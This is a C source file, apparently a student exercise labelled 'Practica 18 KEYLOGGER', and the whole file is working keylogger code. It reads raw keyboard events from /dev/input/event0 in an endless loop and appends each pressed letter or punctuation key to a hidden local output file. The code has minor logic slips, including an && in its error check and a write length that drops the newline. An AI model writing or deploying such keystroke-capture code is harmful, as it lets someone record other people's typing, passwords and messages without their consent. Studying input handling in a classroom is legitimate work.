/*
ARRIETA JIMENEZ DIANA LAURA
PRACTICA 18
KEYLOGGER
*/

#include<stdio.h>
#include<stdlib.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<unistd.h>
#include<linux/input.h>
#include<sys/types.h>

int main ()
{

	int fd,fd_salida;
	char *archivo="/dev/input/event0";
	char *archivo_salida="/home/diana/c/practica18/salida";
	//char buf[256];
	//int ev;
	struct input_event ev;

	fd=open(archivo,O_RDONLY);
	fd_salida=open(archivo_salida,O_WRONLY|O_CREAT|O_APPEND,S_IRUSR|S_IWUSR);

	if(fd==-1 && fd_salida==-1)
		fprintf(stderr,"No se pudo abrir el descriptor de archivo");

	//printf("Descriptor de archivo: %d\n",fd);

	while(1)
	{
		read(fd,&ev,sizeof(struct input_event));
		if(ev.type==1 )
		{
			if(ev.value==1)
			{
				switch (ev.code)
				{
					case 16:
						write(fd_salida,"q\n",1);
						//printf("q\n");
					break;
					case 17:
						write(fd_salida,"w\n",1);
                	                       // printf("w\n"); 
                        	        break; 
					case 18:
						write(fd_salida,"e\n",1);
                	                       // printf("e\n"); 
                        	        break; 
					case 19:
						write(fd_salida,"r\n",1);
        	                               // printf("r\n"); 
                	                break;
					case 20:
						write(fd_salida,"t\n",1);
                                               // printf("t\n");
                                        break;
                                        case 21:
						write(fd_salida,"y\n",1);
                                                //printf("y\n"); 
                                        break; 
                                        case 22:
						write(fd_salida,"u\n",1);
//                                                printf("u\n"); 
                                        break; 
                                        case 23:
						write(fd_salida,"i\n",1);
//                                                printf("i\n"); 
                                        break; 
					case 24:
						write(fd_salida,"o\n",1);
//                                                printf("o\n");
                                        break;
                                        case 25:
						write(fd_salida,"p\n",1);  
                                             // printf("p\n"); 
                                        break; 
                                        case 30:
						write(fd_salida,"a\n",1);
//                                                printf("a\n"); 
                                        break; 
                                        case 31:
						write(fd_salida,"s\n",1);
//                                                printf("s\n"); 
                                        break; 
					case 32:
						write(fd_salida,"d\n",1);  
                                  //            printf("d\n");
                                        break;
                                        case 33:
                                    		write(fd_salida,"f\n",1);
					//            printf("f\n"); 
                                        break; 
                                        case 34:
						write(fd_salida,"g\n",1);
                                              //  printf("g\n"); 
                                        break; 
                                        case 35:
						write(fd_salida,"h\n",1);
                                              //  printf("h\n"); 
                                        break; 
					case 36:
						write(fd_salida,"j\n",1);
//                                                printf("j\n");
                                        break;
                                        case 37:
						write(fd_salida,"k\n",1);  
//                                              printf("k\n"); 
                                        break; 
                                        case 38:
						write(fd_salida,"l\n",1);  
//                                              printf("l\n"); 
                                        break; 
                                        case 44:
						write(fd_salida,"z\n",1);  
 //                                             printf("z\n"); 
                                        break; 
					case 45:
						write(fd_salida,"x\n",1);
//                                                printf("x\n");
                                        break;
                                        case 46:
 						write(fd_salida,"c\n",1); 
//                                              printf("c\n"); 
                                        break; 
                                        case 47:
						write(fd_salida,"v\n",1);  
 //                                             printf("v\n"); 
                                        break; 
                                        case 48:
						write(fd_salida,"b\n",1);
//                                                printf("b\n"); 
                                        break; 
					case 49:
						write(fd_salida,"n\n",1);
//                                                printf("n\n");
                                        break;
                                        case 50:
						write(fd_salida,"m\n",1);  
//                                              printf("m\n"); 
                                        break; 
                                        case 51:
						write(fd_salida,",\n",1);
//                                                printf(",\n"); 
                                        break; 
                                        case 52:
						write(fd_salida,".\n",1);
//                                                printf(".\n"); 
                                        break;
					default:
						write(fd_salida,"\n",1);
//						printf("\n");
					break; 
				}
			}
		}
	}


	if(close(fd)==-1 && close(fd_salida)==-1)
		fprintf(stderr,"No se pudo cerrar el descriptor de archivo");



}
